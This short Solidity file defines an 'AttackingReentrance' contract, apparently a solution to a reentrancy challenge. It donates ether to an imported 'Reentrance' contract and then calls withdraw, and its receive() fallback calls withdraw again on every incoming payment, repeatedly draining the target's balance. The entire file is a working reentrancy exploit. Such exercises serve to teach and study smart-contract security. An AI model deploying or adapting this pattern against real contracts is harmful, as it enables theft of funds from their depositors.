// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        Reentrance(contractAddress).withdraw();
    }

    function hackContract() external {
        Reentrance(contractAddress).donate{value: address(this).balance}(address(this));
        Reentrance(contractAddress).withdraw();        
    }
}
